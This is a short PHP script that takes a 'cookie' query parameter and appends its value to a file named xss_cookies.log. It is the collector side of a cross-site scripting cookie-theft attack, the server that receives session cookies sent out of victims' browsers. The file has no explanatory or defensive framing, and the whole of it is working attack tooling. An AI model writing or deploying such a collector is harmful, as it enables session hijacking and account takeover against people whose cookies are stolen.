<?php
if (isset($_GET['cookie'])) 
{
  $results = $_GET['cookie'];
  if ($results === "") {
    error_log("No cookie value provided.");
  }
  else {
    error_log('Results for "'.$_GET['cookie'].'":<br/>');
    file_put_contents( "/opt/tmp" . "/xss_cookies.log", $results . "\n");
  }
}
?>